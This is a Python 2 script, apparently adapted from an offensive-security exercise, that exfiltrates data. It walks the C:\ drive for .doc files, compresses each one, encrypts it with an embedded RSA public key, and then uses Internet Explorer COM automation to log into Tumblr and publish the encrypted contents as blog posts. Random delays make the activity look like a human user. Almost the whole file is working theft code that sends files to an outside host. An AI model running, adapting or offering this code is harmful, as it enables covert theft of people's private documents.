#!/usr/bin/env python
# -*- coding: utf-8 -*-

# 利用 IE 的 COM 组件自动化技术窃取数据

import win32com.client
import os
import fnmatch
import time
import random
import zlib
import sys

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "YOURUSERNAME"
password = "YOURPASSWORD"

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2u5E1QysrRsk7/EsnPeD
Bd3upWYQsH1AiphukaRCdAQ5yTVPwYaSUjDSGrdv6BVUhzJ0xmlrkOJwNA2MuCJZ
UQMvjUaMhMZyEDs+oXFZLb6jAJ5XWFdS31yRwROOfGe7LynfjKFwxgVr2MdiLHgO
iErYw4bCvlChUVgOrgs2OiWfc9swbNMkgU5Uj2VLqB5v4Ck+cFaYSCExPSytpHsW
m7uGuLdAB748TJDFRxs/Ush/yvfpxZPIfdfLXk1CZn0uynfLskKXkl0Gr8sU+uuZ
6DKPWrv/lAL6fqm9L4uxPofaWqlr3uHERy1xgVUyCdB3kN/QgiVSWDja3TKj58hB
EwIDAQAB
-----END PUBLIC KEY-----"""


def wait_for_browser(browser):
    # Wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    # while ie.busy:
    #     time.sleep(1)

    return

def encrypt_string(plaintext):
    # Default use SHA-1 and its maximum size for a single block is 214 byte
    chunk_size = 214
    print "Compressing: %d bytes" % len(plaintext)
    plaintext = zlib.compress(plaintext)
    
    print "Encrypting %d bytes" % len(plaintext)
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = ""
    offset = 0

    while offset < len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]

        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))

        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted = encrypted.encode("base64")
    print "Base64 encoded crypto: %d" % len(encrypted)
    return encrypted

def encrypt_post(filename):
    # Open and read the file
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)

    return encrypted_title,encrypted_body

def random_sleep():
    time.sleep(random.randint(5, 10))
    return

def login_to_tumblr(ie):
    # Retrieve all elements in the document
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "signup_determine_email":
            i.setAttribute("value", username)
        elif i.id == "signup_forms_submit":
            i.click()

    # Iterate looking for the login form
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    # You can be presented with different homepages
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, e:
        pass

    random_sleep()

    # The login form is the second form on the page
    wait_for_browser(ie)

    return

def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all

    for i in full_doc:
        try:
            if i.getAttribute("data-name") == "title":
                title_write = i.children[0].children[0].children[0]
                title_default = i.children[0].children[0].children[1]
                title_default.setAttribute("innerHTML", ' ')
                title_write.children[0].setAttribute("innerHTML", title)
                title_write.focus()
                random_sleep()
            elif i.getAttribute("data-name") == "body":
                body_write = i.children[0].children[0].children[0]
                body_default = i.children[0].children[0].children[3]
                body_default.setAttribute("innerHTML", ' ')
                body_write.children[0].setAttribute("innerHTML", post)
                body_write.focus()
                random_sleep()
            elif i.getAttribute("data-subview") == "savePostButton":
                title_write.focus()
                random_sleep()
                button = i.children[0].children[1]
                button.click()
                random_sleep()
        except Exception, e:
            # print e
            pass
            
    wait_for_browser(ie)
    random_sleep()

    return

def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    # Head to tumblr and login
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print "Logging in..."
    login_to_tumblr(ie)
    random_sleep()

    full_doc = ie.Document.all

    # 这种方式会导致 IE 一直处于忙的状态（后续无法获取正确的 Document）
    # print "Logged in...navigating"
    # ie.Navigate("https://www.tumblr.com/new/text")
    # wait_for_browser(ie)

    for i in full_doc:
        try:
            if i.id == "new_post_label_text":
                print "Logged in...navigating"
                i.click()
                random_sleep()
        except:
            pass
    
    # Encrypt the file
    print document_path
    title, body = encrypt_post(document_path)

    print "Creating new post..."
    post_to_tumblr(ie, title, body)
    print "Posted!"

    # Destroy the IE instance
    ie.Quit()
    ie = None

    return

# Main loop for document discovery
for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        want = raw_input("Continue?(Enter 'n' to quit)")
        if want == 'n':
            sys.exit()